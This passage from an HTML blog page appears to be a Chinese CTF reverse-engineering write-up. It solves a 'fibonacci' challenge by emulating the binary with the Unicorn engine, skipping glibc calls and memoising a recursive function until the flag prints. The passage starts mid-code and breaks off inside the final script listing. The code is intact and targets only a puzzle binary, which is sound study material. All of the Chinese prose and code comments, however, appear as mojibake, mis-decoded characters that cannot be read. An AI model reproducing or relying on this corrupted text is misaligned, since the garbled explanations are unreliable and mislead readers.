&lt;&lt; v8) == v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">    _IO_putc(v6 ^ (LOBYTE(v10[<span class="number">0</span>]) &lt;&lt; v8), <span class="built_in">stdout</span>);<span class="comment">//æ‰“å° flag å­—ç¬¦</span></span><br><span class="line">  &#125;</span><br><span class="line">  _IO_putc(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¥çœ‹ä¸€ä¸‹<code>FIB</code>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">FIB</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// er12</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = FIB(<span class="number">0LL</span>, a2);<span class="comment">// å‡ºå£</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = FIB((a1 - <span class="number">2</span>), a2);<span class="comment">// é€’å½’è°ƒç”¨ FIB</span></span><br><span class="line">      result = v3 + FIB((a1 - <span class="number">1</span>), a2);<span class="comment">// é€’å½’è°ƒç”¨ FIB</span></span><br><span class="line">    &#125;</span><br><span class="line">    v5 = ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x33333333</span>;</span><br><span class="line">    v6 = v5</span><br><span class="line">       + ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &amp; <span class="number">0x33333333</span>)</span><br><span class="line">       + ((v5 + ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &amp; <span class="number">0x33333333</span>)) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    *a2 ^= ((BYTE1(v6) &amp; <span class="number">0xF</span>) + (v6 &amp; <span class="number">0xF</span>) + ((((v6 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF0F0F</span>) + (v6 &amp; <span class="number">0xF0F0F0F</span>)) &gt;&gt; <span class="number">16</span>)) &amp; <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a2 ^= <span class="number">1u</span>;</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°ç¨‹åºåœ¨ä¸æ–­é€’å½’è°ƒç”¨<code>FIB</code>ï¼Œè€Œé€’å½’å‡½æ•°çš„ç¼ºç‚¹æ˜¾è€Œæ˜“è§ï¼š</p><ol><li><p>é€’å½’ç”±äºæ˜¯å‡½æ•°è°ƒç”¨è‡ªèº«ï¼Œè€Œ<strong>å‡½æ•°è°ƒç”¨æ˜¯æœ‰æ—¶é—´å’Œç©ºé—´çš„æ¶ˆè€—</strong>çš„ï¼šæ¯ä¸€æ¬¡å‡½æ•°è°ƒç”¨ï¼Œéƒ½éœ€è¦åœ¨å†…å­˜æ ˆä¸­åˆ†é…ç©ºé—´ä»¥ä¿å­˜å‚æ•°ã€è¿”å›åœ°å€ä»¥åŠä¸´æ—¶å˜é‡ï¼Œè€Œ<strong>å¾€æ ˆä¸­å‹å…¥æ•°æ®å’Œå¼¹å‡ºæ•°æ®éƒ½éœ€è¦æ—¶é—´</strong>ã€‚-&gt;æ•ˆç‡</p></li><li><p>é€’å½’ä¸­å¾ˆå¤šè®¡ç®—éƒ½æ˜¯é‡å¤çš„ï¼Œç”±äºå…¶æœ¬è´¨æ˜¯æŠŠä¸€ä¸ªé—®é¢˜åˆ†è§£æˆä¸¤ä¸ªæˆ–è€…å¤šä¸ªå°é—®é¢˜ï¼Œ<strong>å¤šä¸ªå°é—®é¢˜å­˜åœ¨ç›¸äº’é‡å çš„éƒ¨åˆ†</strong>ï¼Œåˆ™å­˜åœ¨é‡å¤è®¡ç®—ï¼Œå¦‚<code>fibonacciæ–æ³¢é‚£å¥‘æ•°åˆ—</code>çš„é€’å½’å®ç°ã€‚-&gt;æ•ˆç‡</p></li></ol><p>å› æ­¤éœ€è¦è€ƒè™‘ä¼˜åŒ–é—®é¢˜ï¼Œè‹¥é€‰æ‹©é‡æ„ä»£ç åˆ™å¤ªè¿‡å¤æ‚ï¼Œä¸”æ˜“äº§ç”Ÿ<code>bug</code>ï¼Œè€Œä½¿ç”¨<code>unicorn</code>å°±èƒ½å¾ˆå¥½åœ°é¿å…è¿™ä¸ªé—®é¢˜ã€‚</p><h3 id="1-åˆ©ç”¨unicornè¿è¡Œç›®æ ‡ç¨‹åº"><a href="#1-åˆ©ç”¨unicornè¿è¡Œç›®æ ‡ç¨‹åº" class="headerlink" title="1. åˆ©ç”¨unicornè¿è¡Œç›®æ ‡ç¨‹åº"></a>1. åˆ©ç”¨unicornè¿è¡Œç›®æ ‡ç¨‹åº</h3><p>é¦–å…ˆå…ˆå°†éœ€è¦çš„åº“å¯¼å…¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *<span class="comment"># å¯¼å…¥unicornåº“</span></span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *<span class="comment"># å› ä¸ºç¨‹åºæ˜¯x86æ¶æ„çš„ï¼Œæ•…å¯¼å…¥x86çš„å¸¸é‡</span></span><br><span class="line"><span class="keyword">import</span> struct<span class="comment"># ç”¨äºæ‰“åŒ…æ•°æ®</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">name</span>):<span class="comment"># è¯»å–ç›®æ ‡æ–‡ä»¶çš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:<span class="comment"># ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºåªè¯»</span></span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32</span>(<span class="params">data</span>):<span class="comment"># è§£åŒ…æ•°æ®</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;I&quot;</span>,data)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">num</span>):<span class="comment"># æ‰“åŒ…æ•°æ®</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;I&quot;</span>,num)</span><br></pre></td></tr></table></figure><p>è®°ä½<code>python3</code>ä¸‹äºŒè¿›åˆ¶æ–‡ä»¶çš„æ‰“å¼€å½¢å¼ä¸º<strong>â€˜rbâ€™</strong>ï¼Œå¦åˆ™ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeDecodeError: <span class="string">&#x27;utf-8&#x27;</span> codec can<span class="string">&#x27;t decode byte 0x90 in position 24: invalid start byte</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆå®ä¾‹åŒ–ä¸€ä¸ªåŸºäº<code>X86</code>æ¶æ„çš„æ¨¡å¼ä¸º<code>64ä½</code>çš„æ¨¡æ‹Ÿå™¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)<span class="comment"># å…¶ä»–æ¶æ„å’Œæ¨¡å¼è¯¦è§æ–‡æ¡£</span></span><br></pre></td></tr></table></figure><p>æ¥ç€å¼€è¾Ÿä¸¤æ®µç©ºé—´ï¼Œä¸€æ®µç”¨äºå‚¨å­˜ç¨‹åºä»£ç ï¼Œå¦ä¸€æ®µç”¨äºæ¨¡æ‹Ÿæ ˆï¼Œç”³è¯·å¤§å°å‡ä¸º1024<em>1024(å³*<em>1MB</em></em>)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">prog_base = <span class="number">0x400000</span><span class="comment"># åˆå§‹ç©ºé—´åœ°å€</span></span><br><span class="line">prog_size = <span class="number">1024</span>*<span class="number">1024</span><span class="comment"># ç©ºé—´å¤§å°</span></span><br><span class="line">stack_base = <span class="number">0x0</span><span class="comment"># åˆè¯•æ ˆåœ°å€</span></span><br><span class="line">stack_size = <span class="number">1024</span>*<span class="number">1024</span><span class="comment"># æ ˆå¤§å°</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(prog_base, prog_size)<span class="comment"># ç”³è¯·(æ˜ å°„) 1MB å†…å­˜ç”¨äºå­˜æ”¾ç¨‹åº</span></span><br><span class="line">mu.mem_map(stack_base, stack_size)<span class="comment"># ç”³è¯·(æ˜ å°„) 1MB å†…å­˜ç”¨äºå­˜æ”¾æ ˆ</span></span><br><span class="line"></span><br><span class="line">mu.mem_write(prog_base, read_file(<span class="string">&quot;./fibonacci&quot;</span>))<span class="comment"># å†™å…¥ç¨‹åº</span></span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, stack_base+stack_size-<span class="number">1</span>)<span class="comment"># ä¿®æ”¹RSPæŒ‡é’ˆ</span></span><br></pre></td></tr></table></figure><p>è®¾ç½®ç¨‹åºçš„åŠ è½½åœ°å€å’Œç»“æŸåœ°å€ï¼Œåˆ†åˆ«ä¸º<code>0x4004E0</code>å’Œ<code>0x400575</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x4004E0</span></span><br><span class="line">end = <span class="number">0x400575</span></span><br><span class="line">mu.emu_start(start, end)<span class="comment"># ä»startå¼€å§‹æ‰§è¡Œç›´è‡³end</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿è¡Œä¸€ä¸‹è„šæœ¬ï¼Œå‘ç°æŠ¥é”™ï¼Œè¯´æ˜¯è¯»åˆ°éæ³•çš„åœ°å€ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;try.py&quot;</span>, line 28, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    mu.emu_start(start, end)</span><br><span class="line">  File <span class="string">&quot;/home/fuzz/.local/lib/python3.8/site-packages/unicorn/unicorn.py&quot;</span>, line 525, <span class="keyword">in</span> emu_start</span><br><span class="line">    raise UcError(status)</span><br><span class="line">unicorn.unicorn.UcError: Invalid memory <span class="built_in">read</span> (UC_ERR_READ_UNMAPPED)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ˜¯èµ°åˆ°å“ªä¸€æ­¥æŠ¥é”™äº†å‘¢ï¼Ÿæˆ‘ä»¬éœ€è¦æ·»åŠ <code>hook</code>å°†æˆåŠŸæ‰§è¡Œçš„ä»£ç å’Œå…¶<strong>å¤§å°</strong>ç»™æ‰“å°å‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27;</span> %(address, size))</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)<span class="comment"># æ·»åŠ äº†hookåæ¯æ‰§è¡Œä¸€å¥ä»£ç å°±ä¼šæ‰§è¡Œhook_codeå†…çš„æ“ä½œ</span></span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 try.py </span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e0, instruction size = 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e1, instruction size = 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e2, instruction size = 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e4, instruction size = 0x5</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e9, instruction size = 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004eb, instruction size = 0x4</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004ef, instruction size = 0x7</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;try.py&quot;</span>, line 34, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    mu.emu_start(start, end)</span><br><span class="line">  File <span class="string">&quot;/home/fuzz/.local/lib/python3.8/site-packages/unicorn/unicorn.py&quot;</span>, line 525, <span class="keyword">in</span> emu_start</span><br><span class="line">    raise UcError(status)</span><br><span class="line">unicorn.unicorn.UcError: Invalid memory <span class="built_in">read</span> (UC_ERR_READ_UNMAPPED)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—çŸ¥ï¼Œç¨‹åºåœ¨æ‰§è¡Œå¦‚ä¸‹<code>code</code>æŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004EF                 mov     rdi, cs:stdout  ; stream</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬æœªåœ¨ç©ºé—´é‡Œå¼•å…¥<code>glibc</code>ï¼Œæ‰€ä»¥ç›´æ¥è·³è¿‡è¿™äº›å‡½æ•°å°±å¥½äº†ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜éœ€è·³è¿‡çš„<code>code</code>æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004F6                 call    _setbuf</span><br><span class="line">.text:0000000000400502                 call    _printf</span><br><span class="line">.text:000000000040054F                 mov     rsi, cs:stdout  ; fp</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡æ”¹å†™<code>rip</code>è¿›è¡Œè·³è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>å½“ç„¶æˆ‘ä»¬å¯¹æ‰“å°å‡½æ•°ä¹Ÿåº”å½“è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400558                 movsx   edi, dil        ; c</span><br><span class="line">.text:000000000040055C                 add     rbp, 1</span><br><span class="line">.text:0000000000400560                 call    __IO_putc</span><br></pre></td></tr></table></figure><p><code>__IO_putc</code>å°†å¯„å­˜å™¨<code>rdi</code>å†…çš„å…ƒç´ è¿›è¡Œè¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å…¶è¿›è¡Œæ”¹å†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = mu.reg_read(UC_X86_REG_RDI)<span class="comment"># è¯»å‡º rdi é‡Œçš„å€¼è¿›è¡Œæ‰“å°</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>å› æ­¤<code>hook_code</code>æœ‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">instructions_skip_list = [<span class="number">0x4004EF</span>,<span class="number">0x4004F6</span>,<span class="number">0x400502</span>,<span class="number">0x40054F</span>]<span class="comment"># è·³è¿‡glibcå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:<span class="comment"># æ‰§è¡Œåˆ°__IO_putcä¾¿æ‰“å°rdiçš„å€¼ï¼Œå¹¶è·³è¿‡</span></span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>å†æ¬¡æ‰§è¡Œï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 try.py </span><br><span class="line">h</span><br><span class="line">x</span><br><span class="line">p</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°æ‰“å°<code>flag</code>ä¾æ—§å¾ˆæ…¢ï¼Œå› æ­¤å°±éœ€è¦å¼€å§‹æˆ‘ä»¬çš„ä¼˜åŒ–å·¥ä½œ</p><h3 id="2-ä¼˜åŒ–ç¨‹åºï¼Œæé«˜é€Ÿåº¦"><a href="#2-ä¼˜åŒ–ç¨‹åºï¼Œæé«˜é€Ÿåº¦" class="headerlink" title="2. ä¼˜åŒ–ç¨‹åºï¼Œæé«˜é€Ÿåº¦"></a>2. ä¼˜åŒ–ç¨‹åºï¼Œæé«˜é€Ÿåº¦</h3><p>å¾ˆæ˜¾ç„¶è®¸å¤šå‚æ•°ä»¥åŠè¿”å›å€¼ä¸€æ ·çš„<code>FIB</code>å‡½æ•°è¢«é‡å¤è°ƒç”¨äº†å¤šæ¬¡ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹è¿™äº›è¢«é‡å¤è°ƒç”¨è¿‡çš„å‡½æ•°è¿›è¡Œè®°å½•ï¼Œå½“å‚æ•°ä¸€æ ·æ—¶ï¼Œä¸å†ç»è¿‡ä¸­é—´çš„è®¡ç®—ï¼Œè€Œç›´æ¥ç»™å‡ºè¿”å›å€¼ã€‚</p><p>å¦‚ä½•ä¿å­˜è¿™äº›æˆå¯¹çš„å€¼ï¼Ÿ</p><ul><li>åœ¨å‡½æ•°å¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥å‚æ•°å¯¹åº”çš„å€¼æ˜¯å¦å·²ç»è¢«dictè®°å½•<ul><li>å¦‚æœæ˜¯ï¼Œç›´æ¥è¿”å›è¿™ä¸ªkey-valueå°±è¡Œï¼Œåªéœ€å°†è¿”å›å€¼å†™å…¥åˆ°<code>RAX</code>ä¸­ï¼ŒåŒæ—¶è®¾ç½®<code>RIP</code>ä¸º<code>RET</code>æŒ‡ä»¤çš„å€¼ï¼Œé€€å‡ºè¿™ä¸ªå‡½æ•°ã€‚ä¸èƒ½åœ¨<code>fabonacci</code>å‡½æ•°å†…ç›´æ¥è·³è½¬åˆ°<code>RET</code>ï¼Œå› ä¸ºè¿™æ¡æŒ‡ä»¤å·²ç»è¢«HOOKäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è·³è½¬åˆ°<code>main</code>ä¸­çš„<code>ret</code>ã€‚</li><li>å¦‚æœdictä¸­æ²¡æœ‰å‡ºç°å‚æ•°å’Œå¯¹åº”çš„å€¼ï¼Œå°†å‚æ•°æ·»åŠ åˆ°dictä¸­ã€‚</li></ul></li><li>å½“é€€å‡ºå‡½æ•°çš„æ—¶å€™ï¼Œä¿å­˜è¿”å›å€¼ã€‚å¯ä»¥ä»æˆ‘ä»¬çš„æ ˆç»“æ„ä¸­è¯»å–å‚æ•°å’Œè¿”å›å€¼ã€‚</li></ul><p>å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨æ‰§è¡Œåˆ°<code>FIB</code>å‡½æ•°æ—¶è¿›è¡Œåˆ¤æ–­ï¼Œåœ¨<code>FIB</code>è¿”å›çš„æ—¶å€™è¿›è¡Œæ›´æ–°ï¼Œæ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Fib_entry = <span class="number">0x400670</span></span><br><span class="line">Fib_return = [<span class="number">0x4006F1</span>, <span class="number">0x400709</span>]</span><br><span class="line"></span><br><span class="line">stack = []</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:</span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == Fib_entry:</span><br><span class="line">        arg0 = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        r_rsi = mu.reg_read(UC_X86_REG_RSI)</span><br><span class="line">        arg1 = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arg0,arg1) <span class="keyword">in</span> d:</span><br><span class="line">            (ret_rax, ret_ref) = d[(arg0,arg1)]</span><br><span class="line">            mu.reg_write(UC_X86_REG_RAX, ret_rax)</span><br><span class="line">            mu.mem_write(r_rsi, p32(ret_ref))</span><br><span class="line">            mu.reg_write(UC_X86_REG_RIP,<span class="number">0x400582</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stack.append((arg0,arg1,r_rsi))</span><br><span class="line">    <span class="keyword">elif</span> address <span class="keyword">in</span> Fib_return:</span><br><span class="line">        (arg0, arg1, r_rsi) = stack.pop()</span><br><span class="line">        ret_rax = mu.reg_read(UC_X86_REG_RAX)</span><br><span class="line">        ret_ref = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line">        d[(arg0, arg1)] = (ret_rax, ret_ref)</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œè„šæœ¬ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 exp.py </span><br><span class="line">h</span><br><span class="line">x</span><br><span class="line">p</span><br><span class="line">&#123;</span><br><span class="line">F</span><br><span class="line">1</span><br><span class="line">b</span><br><span class="line">0</span><br><span class="line">n</span><br><span class="line">4</span><br><span class="line">c</span><br><span class="line">C</span><br><span class="line">i</span><br><span class="line">_</span><br><span class="line">n</span><br><span class="line">u</span><br><span class="line">m</span><br><span class="line">Z</span><br><span class="line">_</span><br><span class="line">4</span><br><span class="line">r</span><br><span class="line">3</span><br><span class="line">_</span><br><span class="line">T</span><br><span class="line">0</span><br><span class="line">O</span><br><span class="line">_</span><br><span class="line">3</span><br><span class="line">a</span><br><span class="line">5</span><br><span class="line">Y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-å®Œæ•´EXP"><a href="#3-å®Œæ•´EXP" class="headerlink" title="3. å®Œæ•´EXP"></a>3. å®Œæ•´EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 